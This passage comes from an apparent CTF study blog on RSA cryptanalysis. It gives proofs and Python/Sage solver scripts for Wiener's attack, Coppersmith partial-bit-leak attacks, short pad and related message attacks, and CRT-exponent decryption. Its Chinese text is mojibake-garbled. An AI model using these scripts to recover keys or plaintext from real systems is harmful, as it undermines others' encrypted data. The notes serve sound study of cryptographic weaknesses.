\frac{(p-1)(q-1)}{gcd(p-1,q-1)})$</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(p, q, dp, dq)</span>:</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    dd = int(gmpy2.gcd(p - <span class="number">1</span>, q - <span class="number">1</span>))</span><br><span class="line">    modules = phi // dd</span><br><span class="line">    d = int(gmpy2.invert((p - <span class="number">1</span>) // dd, (q - <span class="number">1</span>) // dd)) * \</span><br><span class="line">        (dq - dp) * (p - <span class="number">1</span>) // dd + dp</span><br><span class="line">    d %= modules</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(d, phi) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">        d += modules</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p = int(input(<span class="string">"p = "</span>))</span><br><span class="line">    q = int(input(<span class="string">"q = "</span>))</span><br><span class="line">    dp = int(input(<span class="string">"dp = "</span>))</span><br><span class="line">    dq = int(input(<span class="string">"dq = "</span>))</span><br><span class="line">    c = int(input(<span class="string">"c = "</span>))</span><br><span class="line">    d = decrypt(p, q, dp, dq)</span><br><span class="line">    plaintext = long_to_bytes(pow(c, d, p * q))</span><br><span class="line">    print(plaintext)</span><br></pre></td></tr></table></figure><h4 id="sage"><a href="#sage" class="headerlink" title="sage"></a>sage</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = crt(dp, dq, p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="RSA-Wienerâ€™s-Attack"><a href="#RSA-Wienerâ€™s-Attack" class="headerlink" title="RSA - Wienerâ€™s Attack"></a>RSA - Wienerâ€™s Attack</h3><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem"></a>Theorem</h4><script type="math/tex; mode=display">Let \ N=pq\ with\ q<p<2q. Let\ d<\frac{1}{3}N^{\frac{1}{4}}.\\\\Known (N,e),we\ can\ use\ Wiener's\ attack.\\\\</script><hr><p>$Since\ ed\equiv 1(mod\ \varphi(N)),\exists k\in N,s.t.\ ed=k\varphi(N)+1\Rightarrow\left|\frac{e}{\varphi(N)}-\frac{k}{d}\right|=1.$<br>From q&lt;p&lt;2q, it follows $\sqrt{N}&lt;p&lt;\sqrt{2N}$, hence<br>$N-\varphi(N)=p+q-1=p+\frac{N}{p}-1&lt;\frac{3\sqrt{2}}{2}\sqrt{N}&lt;3\sqrt{N}$<br>$\therefore\left|\frac{e}{N}-\frac{k}{d}\right|=\left|\frac{ed-k\varphi(N)+k\varphi(N)-kN}{Nd}\right|=\left|\frac{1+k(\varphi(N)-N)}{Nd}\right|\leq\left|\frac{3k\sqrt{N}}{Nd}\right|=\left|\frac{3k}{\sqrt{N}d}\right|$<br>$\because k\varphi(N)=ed-1&lt;ed,\ e&lt;\varphi(N)\quad \therefore k\varphi(N)&lt;d\varphi(N)\rightarrow k&lt;d&lt;\frac{1}{3}N^{\frac{1}{4}}$<br>$\therefore\left|\frac{e}{N}-\frac{k}{d}\right|\leq\left|\frac{3k}{\sqrt{N}d}\right|&lt;\left|\frac{3k}{\sqrt{N}d}\right|&lt;\frac{1}{3d\cdot d}&lt;\frac{1}{2d^2}$</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/image-20200122234635721.png" alt></p><p>Therefore,we can get $\frac{k}{d}$ from the convergents of $\frac{e}{N}$.</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_quotients</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    a = x // y</span><br><span class="line">    quotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        quotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> quotients</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_quotients</span><span class="params">(quotients)</span>:</span></span><br><span class="line">    convergents = [(quotients[<span class="number">0</span>], <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, len(quotients) + <span class="number">1</span>):</span><br><span class="line">        quotients_partion = quotients[<span class="number">0</span>:i]</span><br><span class="line">        denom = quotients_partion[<span class="number">-1</span>]  <span class="comment"># åˆ†æ¯</span></span><br><span class="line">        num = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">-2</span>, -len(quotients_partion), <span class="number">-1</span>):</span><br><span class="line">            num, denom = denom, quotients_partion[_] * denom + num</span><br><span class="line">        num += denom * quotients_partion[<span class="number">0</span>]</span><br><span class="line">        convergents.append((num, denom))</span><br><span class="line">    <span class="keyword">return</span> convergents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WienerAttack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    quotients = rational_to_quotients(e, n)</span><br><span class="line">    convergents = convergents_from_quotients(quotients)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">and</span> <span class="keyword">not</span> (e * d - <span class="number">1</span>) % k:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            <span class="comment"># check if (x^2 - coef * x + n = 0) has integer roots</span></span><br><span class="line">            coef = n - phi + <span class="number">1</span></span><br><span class="line">            delta = coef * coef - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> delta &gt; <span class="number">0</span> <span class="keyword">and</span> gmpy2.iroot(delta, <span class="number">2</span>)[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">                print(<span class="string">'d = '</span> + str(d))</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    e = int(input(<span class="string">"e = "</span>))</span><br><span class="line">    n = int(input(<span class="string">"n = "</span>))</span><br><span class="line">    c = int(input(<span class="string">"c = "</span>))</span><br><span class="line">    d = WienerAttack(e, n)</span><br><span class="line">    plaintext = long_to_bytes(pow(c, d, n))</span><br><span class="line">    print(plaintext)</span><br></pre></td></tr></table></figure><h3 id="RSA-Partial-m"><a href="#RSA-Partial-m" class="headerlink" title="RSA - Partial_m"></a>RSA - Partial_m</h3><h4 id="Theorem-4"><a href="#Theorem-4" class="headerlink" title="Theorem"></a>Theorem</h4><p>æ±‚è§£ä¸€å…ƒåŒä½™æ–¹ç¨‹çš„é—®é¢˜å¯ä»¥è¿™æ ·æ¥è¡¨è¾¾ï¼šç»™å®šä¸€ä¸ªæœªçŸ¥åˆ†è§£çš„åˆæ•°Nï¼Œbæ˜¯Nçš„ä¸€ä¸ªå› å­ï¼ˆæ³¨æ„bæ˜¯åˆæ•°ï¼‰ï¼Œä¸”å¯¹ä¸€ä¸ªå·²çŸ¥çš„$\beta(0&lt;\beta&lt;1)$ï¼Œæ»¡è¶³$b\geq N^{\beta}$ã€‚ç»™å®šä¸€ä¸ªåº¦æ•°ä¸º$\delta$ï¼Œé¦–1çš„å•å˜é‡å¤šé¡¹å¼$f_{b}(x)\in Z[X]$ï¼Œåœ¨$\delta$å’ŒNçš„æ¯”ç‰¹é•¿åº¦çš„å¤šé¡¹å¼å‡½æ•°æ—¶é—´å†…æ‰¾åˆ°æ‰€æœ‰$b|f_{b}(x)$çš„æ»¡è¶³$|x_{0}|\leq X$çš„æ ¹$x_{0}\in Z$ï¼ŒXæ˜¯$x_{0}$çš„ä¸Šç•Œã€‚ç›®æ ‡æ˜¯é€šè¿‡å°½å¯èƒ½å®½æ¾çš„ç•ŒXè·å¾—æ›´å¤§çš„è§£å‡ºxçš„å¯èƒ½æ€§ã€‚</p><p><strong>å®šç†1</strong> (Coppersmith 96)ï¼š$N,b,\beta,f,\delta$å®šä¹‰åŒä¸Šã€‚æ­¤æ—¶æˆ‘ä»¬å¯ä»¥åœ¨$O(c\delta^{5}log^{9}N)$å†…å¾—åˆ°æ»¡è¶³æ¡ä»¶ï¼š</p><p>$|x_{0}|\leq \frac{1}{2}N^{\frac{\beta^{2}}{\delta}-\epsilon}$</p><p>çš„ï¼Œä¸€å…ƒåŒä½™æ–¹ç¨‹f(x)=0 mod bçš„è§£ ($\epsilon$å¤šå–$\frac{\beta}{7}$, è¯æ˜ç•¥)</p><p><strong>å®šç†2</strong> (CopperSmith 96[2])ï¼šå®šç†1åœ¨N=bæ—¶çš„ç‰¹æ®Šæƒ…å†µï¼Œå¯ä»¥åœ¨(log N,$\delta$)çš„å¤šé¡¹å¼æ—¶é—´å†…æ±‚å‡ºæ‰€æœ‰æ»¡è¶³ï¼š</p><p>$|x_{0}|\leq N^{\frac{1}{\delta}}$</p><p>çš„æ¨¡ç­‰å¼$f_{N}(x)=0\ mod\ N$çš„è§£</p><p>$\therefore$ eè¶³å¤Ÿå°ï¼Œä¸”éƒ¨åˆ†æ˜æ–‡æ³„éœ²æ—¶ï¼Œå¯ä»¥é‡‡ç”¨coppersmithå•å˜é‡æ¨¡ç­‰å¼çš„æ”»å‡»ï¼Œå¦‚ä¸‹ï¼š</p><p>$c:=m^{e}\ mod\ n=(mbar+x_{0})^{e}\ mod\ n$ , (mbar = (m &gt;&gt; kbits) &lt;&lt; kbits)</p><p>å®šç†2çŸ¥ï¼Œ$|x_{0}|\leq N^{\frac{1}{e}}$æ—¶ï¼Œå¯ä»¥åœ¨logNå’Œeçš„å¤šé¡¹å¼æ—¶é—´å†…æ±‚å‡ºx</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">mbar = </span><br><span class="line">kbits = </span><br><span class="line"></span><br><span class="line">beta = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">nbits = n.nbits()</span><br><span class="line">print(<span class="string">"upper &#123;&#125; bits of &#123;&#125; bits is given"</span>.format(nbits - kbits, nbits))</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x)^e - c</span><br><span class="line"></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line">print(<span class="string">"m:"</span>, mbar + x0)</span><br></pre></td></tr></table></figure><h4 id="Note-1"><a href="#Note-1" class="headerlink" title="Note"></a>Note</h4><p>mé«˜ä½æ³„éœ²æ˜¯coppersmithçš„åŸç‰ˆç»“è®ºï¼Œå®é™…ä¸Šå¯ä»¥æ‰©å±•åˆ°é«˜ä½/ä½ä½/é«˜ä½ä½æ³„éœ²çš„ä¸€èˆ¬æƒ…å†µ</p><p>$m=M+x_{0}\cdot 2^{k}+Mâ€™$</p><p>$f_{n}(x):=(M+x_{0}\cdot 2^{k}+Mâ€™)^{e}-c$</p><p>åŒ–ä¸ºé¦–1å³å¯sageæ±‚è§£ï¼ˆåªè¦æœªçŸ¥æ˜æ–‡$|x_{0}|\leq N^{\frac{1}{e}}$ï¼‰</p><h3 id="RSA-Partial-p"><a href="#RSA-Partial-p" class="headerlink" title="RSA - Partial_p"></a>RSA - Partial_p</h3><h4 id="Theorem-5"><a href="#Theorem-5" class="headerlink" title="Theorem"></a>Theorem</h4><p><strong>å®šç†3</strong> (Coppersmith: kpé«˜ä½æ¯”ç‰¹)ï¼š$p&gt;q,k\in N^{*},q\nmid k$ï¼Œå¦‚æœå¯¹äºkpçš„ä¸€ä¸ªä¼°è®¡å€¼$\widetilde{p}$æ»¡è¶³$|kp-\widetilde{p}|\leq 2N^{\frac{1}{4}}$</p><p>é‚£ä¹ˆåœ¨å¤šé¡¹å¼æ—¶é—´å†…å¯ä»¥å¾—åˆ°Nçš„åˆ†è§£</p><p>Proofï¼š</p><p>$f_{p}(x):=x+\widetilde{p}$çš„ä¸€ä¸ªè§£$x_{0}=(kp-\widetilde{p})\ mod\ p$ æ»¡è¶³$x_{0}\leq 2N^{\frac{1}{4}}$ã€‚è¯¥å¤šé¡¹å¼é¦–1ï¼Œä¸”$p\geq N^{\frac{1}{2}}$ï¼Œç”±å®šç†1çŸ¥è¯¥æ–¹ç¨‹æœ‰è§£ </p><p>å¾€ä¸€èˆ¬å½¢å¼ä¸Šæ¨å¹¿ï¼Œå‘ç°pçš„ä½ä½æ¯”ç‰¹æ³„éœ²ä¹Ÿèƒ½ä½¿ç”¨coppersmithæ”»å‡»ï¼ŒåŒ–ä¸ºé¦–1å³å¯ï¼Œå¯ç±»æ¯”partial_mçš„æ‰©å±•å½¢å¼</p><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">pbar = </span><br><span class="line">kbits = </span><br><span class="line"></span><br><span class="line">print(<span class="string">"upper %d bits (of %d bits) is given"</span> % (pbar.nbits()-kbits, pbar.nbits()))</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line"></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">p = x0 + pbar</span><br><span class="line">print(<span class="string">"p:"</span>, p)</span><br><span class="line">q = n // int(p)</span><br><span class="line">d = inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(<span class="string">"m:"</span>, pow(c, d, n))</span><br></pre></td></tr></table></figure><h4 id="Note-2"><a href="#Note-2" class="headerlink" title="Note"></a>Note</h4><p>sageçš„small_rootä¼ å‚Xä¸èƒ½è¿‡å¤§ï¼Œéœ€è‡ªè¡Œåˆ¤æ–­é˜ˆå€¼å¹¶è°ƒæ•´ï¼ˆå¦‚æœXè¿‡å¤§ï¼Œå³ä½¿å­˜åœ¨Xå†…çš„è§£ï¼Œä¹Ÿæ— æ³•æ±‚å‡ºï¼‰</p><p>æ¯”å¦‚pçš„ä½ä½æ³„éœ²æ—¶å› ä¸ºä¸ç¡®å®šç¼ºå¤±é«˜ä½çš„å…·ä½“æ¯”ç‰¹æ•°ï¼Œæ‰€ä»¥è¦åœ¨$2^{\frac{n.nbits()}{2}-kbits}$é™„è¿‘ä½œXçš„é˜ˆå€¼ä¼°è®¡</p><p>æ— æ³•ç¡®å®šæ‹¿åˆ°çš„pæ˜¯å¦å¤§äºqï¼Œæ‰€ä»¥å¯¹$\beta=0.5$è¿›è¡Œè°ƒæ•´è‡³0.4</p><h3 id="RSA-Partial-d"><a href="#RSA-Partial-d" class="headerlink" title="RSA - Partial_d"></a>RSA - Partial_d</h3><h4 id="Theorem-6"><a href="#Theorem-6" class="headerlink" title="Theorem"></a>Theorem</h4><p>Given the $\frac{n.nbits()}{4}$ least significant bits of dï¼Œwe can compute all of d in polynomial time in n and e.</p><p>Proofï¼š</p><p>$s \leftarrow p+q$ï¼Œ$ed=1+k\phi (n)=1+k(n-s+1)$</p><p>$\therefore ed_{0}\equiv 1+k(n-s+1)\ mod\ 2^{\frac{n}{4}}\quad (1)$</p><p>$\because p^{2}-sp+n\equiv 0\ mod\ 2^{\frac{n}{4}}\quad (2)$</p><p>$\therefore p\cdot(1),k\cdot(2)\rightarrow ed_{0}p\equiv p+kpn-kp^{2}-kn+kp\ mod\ 2^{\frac{n}{4}}\quad (2)$</p><p>$\therefore$è§£ä¸€å…ƒåŒä½™æ–¹ç¨‹$ed_{0}x-kx(n-x+1)+kn\equiv x\ (mod\ 2^{d_{0}.nbits()})$å³å¯å¾—åˆ°pçš„éƒ¨åˆ†ä½ä½$p_{0}$</p><p>é—®é¢˜è½¬åŒ–ä¸ºpartial_p</p><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span><span class="params">(p0, kbits, n)</span>:</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.4</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p <span class="keyword">and</span> p != <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line">    c = </span><br><span class="line">    d0 = </span><br><span class="line">    beta = <span class="number">0.5</span></span><br><span class="line">    </span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = d0.nbits()</span><br><span class="line">    print(<span class="string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits))</span><br><span class="line"></span><br><span class="line">    p = int(find_p(d0, kbits, e, n))</span><br><span class="line">    print(<span class="string">"found p: %d"</span> % p)</span><br><span class="line">    q = n//int(p)</span><br><span class="line">    print(<span class="string">"d:"</span>, inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br></pre></td></tr></table></figure><h3 id="RSA-Short-Pad-Attack-amp-Related-Message-Attack"><a href="#RSA-Short-Pad-Attack-amp-Related-Message-Attack" class="headerlink" title="RSA - Short Pad Attack &amp; Related Message Attack"></a>RSA - Short Pad Attack &amp; Related Message Attack</h3><h4 id="Theorem-7"><a href="#Theorem-7" class="headerlink" title="Theorem"></a>Theorem</h4><p>å½“paddingé•¿åº¦$m\in (0,\lfloor\frac{n.nbits()}{e^{2}}\rfloor]$æ—¶ï¼Œ$g_{1}=x^{e}-c_{1},g_{2} = (x+y)^{e}-c_{2}$ï¼Œå¯ä»¥å…ˆç”¨ç»“å¼æ±‚è§£ä¸Šè¿°äºŒå…ƒé«˜æ¬¡æ–¹ç¨‹ç»„</p><p><strong>å®šç†4</strong>ï¼šå¦‚æœ$(x_{0},y_{0})$æ˜¯æ–¹ç¨‹ç»„<script type="math/tex">\left\{\begin{aligned}f(x,y)=0\\\\g(x,y)=0\end{aligned}\right.</script>çš„è§£ï¼Œåˆ™$y_{0}$æ˜¯$Res_{x}(f,g)$çš„ä¸€ä¸ªæ ¹</p><p>sageé‡Œå¯ä»¥ç”¨resultantæ¥å®ç°ç»“å¼è®¡ç®—ï¼Œ$g_{1}.resultant(g_{2})$é»˜è®¤å°†ç»“å¼ä»¥ç¬¬äºŒä¸ªå˜é‡æ¥è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥æŒ‡å®š$g_{1}.resultant(g_{2},y)$æ¥å°†ç»“å¼ä»¥xè¡¨ç¤º</p><p>æ±‚å‡ºyåï¼Œé‡‡ç”¨Related Message Attackï¼Œç®€è¦æ¦‚æ‹¬å°±æ˜¯æ±‚è§£$gcd(g_{1},g_{2})$ï¼Œå¦‚æœç»“æœæ˜¯çº¿æ€§çš„ï¼Œåˆ™æ”»å‡»æˆåŠŸ($x=-gcd(g_{1}, g_{2})[0]$)</p><h4 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span><span class="params">(c1, c2, e, n)</span>:</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"></span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span><span class="params">(c1, c2, diff, e, n)</span>:</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(g1, g2)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line"></span><br><span class="line">    c1 =</span><br><span class="line">    c2 = </span><br><span class="line"></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    print(<span class="string">"difference of two messages is %d"</span> % diff)</span><br><span class="line"></span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    print(<span class="string">"m1:"</span>, m1)</span><br><span class="line">    print(<span class="string">"m2:"</span>, m1 + diff)</span><br></pre></td></tr></table></figure><h4 id="Note-3"><a href="#Note-3" class="headerlink" title="Note"></a>Note</h4><p>expçš„change_ringç¼ºå¤±å³æŠ¥é”™ï¼Œä½†åŒç¯ä¸‹è½¬æ¢çš„å…·ä½“åŸå› ï¼Œä¼°è®¡è¦ç¿»sageæ‰‹å†Œorz</p><h3 id="RSA-Boneh-Durfee-Attack"><a href="#RSA-Boneh-Durfee-Attack" class="headerlink" title="RSA - Boneh Durfee Attack"></a>RSA - Boneh Durfee Attack</h3><h4 id="Theorem-8"><a href="#Theorem-8" class="headerlink" title="Theorem"></a>Theorem</h4><p>æ¯”ç»´çº³æ”»å‡»å¼ºåº¦æ›´é«˜çš„å°ç§é’¥æ”»å‡»</p><p>å¼•ç”¨ctf-wikiä¸Šçš„ç®€ç•¥æ¨å¯¼è¿‡ç¨‹ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/image-20200218203256633.png" 